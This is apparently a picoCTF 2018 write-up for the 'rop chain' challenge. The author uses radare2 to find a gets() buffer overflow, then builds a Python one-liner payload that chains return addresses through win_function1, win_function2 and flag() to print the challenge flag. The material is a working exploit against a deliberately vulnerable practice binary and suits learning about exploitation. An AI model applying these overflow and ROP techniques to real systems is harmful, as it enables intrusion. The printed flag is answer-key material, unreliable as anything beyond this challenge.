# [rop chain](https://2018game.picoctf.com/problems)


## Problem
Can you exploit the following [program](https://2018shell3.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop) and get the flag? You can findi the program in /problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9 on the shell server? [Source](https://2018shell3.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop.c).


## Solution

this is actually my first time with rop chains. basically it's a chain of overwritten return-addresses at which you make the instruction pointer go to do what you want. there are tools to automate this process but we'll do this one by hand. glancing at the source cose we can clearly see where we need to hijack the eip each step; something like this, at least as an initial plan: win_function1()->win_function2()->flag().

since i'm using radare2 for debug, i set up the rarun2 profile like this:

```
——> cat rrp.rrp
stdin=./input
aslr=no
```

the aslr part is important otherwise it becomes impossible without making the program leak an address on the stack. then i write the input i would normally give to the program in the file ./input and run r2 -r rrp.rrp. since the buffer is 16 byte, we'll start with 12 and look at the stack

```
——> python -c "print('A' * 12)" > input
[andrei@jacky 00:14:51] ~/Documents/pico
——> xxd input
00000000: 4141 4141 4141 4141 4141 4141 0a         AAAAAAAAAAAA.
——> r2 -Ad rop -r rrp.rrp
Process with PID 32304 started...
[..]
[0xf7fd50b0]> s sym.vuln
[0x08048714]> pdf
/ (fcn) sym.vuln 39
|   sym.vuln ();
|           ; var int local_18h @ ebp-0x18
|           ; CALL XREF from sym.main (0x804877c)
|           0x08048714      55             push ebp
|           0x08048715      89e5           mov ebp, esp
|           0x08048717      83ec18         sub esp, 0x18
|           0x0804871a      83ec0c         sub esp, 0xc
|           0x0804871d      686f890408     push str.Enter_your_input   ; 0x804896f ; "Enter your input> "
|           0x08048722      e8f9fcffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048727      83c410         add esp, 0x10
|           0x0804872a      83ec0c         sub esp, 0xc
|           0x0804872d      8d45e8         lea eax, [local_18h]
|           0x08048730      50             push eax
|           0x08048731      e8fafcffff     call sym.imp.gets           ; char *gets(char *s)
|           0x08048736      83c410         add esp, 0x10
|           0x08048739      c9             leave
\           0x0804873a      c3             ret
[0x08048714]> db @ 0x08048736

```

by breaking right after the call to gets, we can easily see all our buffer and plan the initial overwrite

```
|[x] StackRefs                                                                                                                                                          |
| 0xffffd870  0xffffd880  .... @esp eax stack R W 0x41414141 (AAAAAAAAAAAA) -->  ascii                                                                                  |
| 0xffffd874  0xf7fe9290  .... (/usr/lib32/ld-2.28.so) library R X 'pop edx' 'ld-2.28.so'                                                                               |
| 0xffffd878  0x00000000  .... ebx                                                                                                                                      |
| 0xffffd87c  0x392e8400  ...9                                                                                                                                          |
| 0xffffd880  0x41414141  AAAA @eax ascii                                                                                                                               |
| 0xffffd884  0x41414141  AAAA ascii                                                                                                                                    |
| 0xffffd888  0x41414141  AAAA ascii                                                                                                                                    |
| 0xffffd88c  0x08048700  .... (.text) (/home/andrei/Documents/pico/rop) sym.flag program R X 'jmp 0x8048712' 'rop'                                                     |
| 0xffffd890  0x000003e8  .... (.symtab)                                                                                                                                |
| 0xffffd894  0x000003e8  .... (.symtab)                                                                                                                                |
| 0xffffd898  0xffffd8b8  .... @ebp stack R W 0x0 -->  ebx                                                                                                              |
| 0xffffd89c  0x08048781  .... (.text) (/home/andrei/Documents/pico/rop) sym.main program R X 'mov eax, 0' 'rop'                                                        |
| 0xffffd8a0  0x00000001  .... (.comment)                                                                                                                               |

:> dbt
0  0x8048736  sp: 0x0         0    [sym.vuln]   
1  0xf7fe9290 sp: 0xffffd874  4    [??]  map.usr_lib32_ld_2.28.so.r_x+82576
2  0x8048781  sp: 0xffffd89c  40   [sym.main]  main+70
3  0xf7fe9290 sp: 0xffffd924  136  [??]  map.usr_lib32_ld_2.28.so.r_x+82576
4  0x80484f1  sp: 0xffffd93c  24   [??]  entry0+33
```

our strings starts at 0xffffd880, and the return address to main+70 is at 0xffffd89c; that's 16 more bytes. so let's modify the input file and run again

```
——> python2 -c "print('A' * 28 + '\xcb\x85\x04\x08')" > input
```

we succesfully entered the win_function1; on its ```pop ebp``` instruction the (interesting part of) stack layout is this:

```
0xffffd89c  0x41414141  AAAA @ebp ascii
0xffffd8a0  0x00000000  .... ebx
```

with esp at 0xffffd89c. so it will put 0x41414141 into ebp and return to 0x00000000. no good, we need to replace that return addresses. let's put the address of win_function2 there

```
——> python2 -c "print('A' * 28 + '\xcb\x85\x04\x08\xd8\x85\x04\x08')" > input
——> xxd input
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 cb85 0408  AAAAAAAAAAAA....
00000020: d885 0408 0a                             .....


```

ok it enters win_function2, but then it checks if arg_check1 is 0xbaaaaaad:

```
:> pdf @ sym.win_function2
            ;-- eip:
/ (fcn) sym.win_function2 83
|   sym.win_function2 (int arg_8h);
|           ; arg int arg_8h @ ebp+0x8
|           0x080485d8      55             push ebp
|           0x080485d9      89e5           mov ebp, esp
|           0x080485db      83ec08         sub esp, 8
|           0x080485de      0fb60541a004.  movzx eax, byte obj.win1    ; [0x804a041:1]=1
|           0x080485e5      84c0           test al, al
|       ,=< 0x080485e7      7412           je 0x80485fb
|       |   0x080485e9      817d08adaaaa.  cmp dword [arg_8h], 0xbaaaaaad ; [0xbaaaaaad:4]=-1
|      ,==< 0x080485f0      7509           jne 0x80485fb
```

we can see that it grabs arg_check1 from ebp+8. the value that goes into ebp is the esp at the entrance into the function, so 0xffffd8a0, so we need to write on 0xffffd8a8

this is the stack now
```
:> px 128 @ esp - 64
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd860  243e f9f7 243e f9f7 98d8 ffff 3687 0408  $>..$>......6...
0xffffd870  80d8 ffff 9092 fef7 0000 0000 0082 6583  ..............e.
0xffffd880  adaa aaba 4141 4141 4141 4141 4141 4141  ....AAAAAAAAAAAA
0xffffd890  4141 4141 4141 4141 78d8 ffff 78d8 ffff  AAAAAAAAx...x...
0xffffd8a0  78d8 ffff 00d9 ffff 6cd9 ffff e803 0000  x.......l.......
```

and this is at right after our buffer is copied on the stack

```
:> px 64 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd870  80d8 ffff 9092 fef7 0000 0000 0014 4367  ..............Cg
0xffffd880  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xffffd890  4141 4141 4141 4141 4141 4141 cb85 0408  AAAAAAAAAAAA....
0xffffd8a0  d885 0408 00d9 ffff 6cd9 ffff e803 0000  ........l.......
```

let's just write onto it and hope it doesn't screw up

```
——> python2 -c "print('A' * 28 + '\xcb\x85\x04\x08\xd8\x85\x04\x08BBBB\xad\xaa\xaa\xba')" > input
——> xxd input
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 cb85 0408  AAAAAAAAAAAA....
00000020: d885 0408 4242 4242 adaa aaba 0a         ....BBBB.....
```

it works fine. as we can see we got both the flags set to true

```
:> px @ obj.win1
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a041  01                                       .
:> px @ obj.win2
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0804a042  01                                       .
```

at the next ret instruction, it will go to ```0xffffd8a4  0x42424242  BBBB @esp ascii```, so we'll just but the address of flag() there

```
——> python2 -c "print('A' * 28 + '\xcb\x85\x04\x08\xd8\x85\x04\x08\x2b\x86\x04\x08\xad\xaa\xaa\xba')" > input && xxd input
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 cb85 0408  AAAAAAAAAAAA....
00000020: d885 0408 2b86 0408 adaa aaba 0a         ....+........
```

this will also check for the value 0xdeadbaad in arg_check2 in ebp+8. base pointer will be 0xffffd8a4, so we'll need to write on 0xffffd8ac, right after arg_check1

```
——> python2 -c "print('A' * 28 + '\xcb\x85\x04\x08\xd8\x85\x04\x08\x2b\x86\x04\x08\xad\xaa\xaa\xba\xad\xba\xad\xde')" > input && xxd input
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 cb85 0408  AAAAAAAAAAAA....
00000020: d885 0408 2b86 0408 adaa aaba adba adde  ....+...........
00000030: 0a                                       .
```

check okay, and it prints the flag. congratulations to me for my first rop thing lol

```
xnand@pico-2018-shell-3:/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9$ ./rop <<< $(python2 -c "print('A' * 28 + '\xcb\x85\x04\x08\xd8\x85\x04\x08\x2b\x86\x04\x08\xad\xaa\xaa\xba\xad\xba\xad\xde')")
Enter your input> picoCTF{rOp_aInT_5o_h4Rd_R1gHt_718e6c5c}
Segmentation fault (core dumped)
```
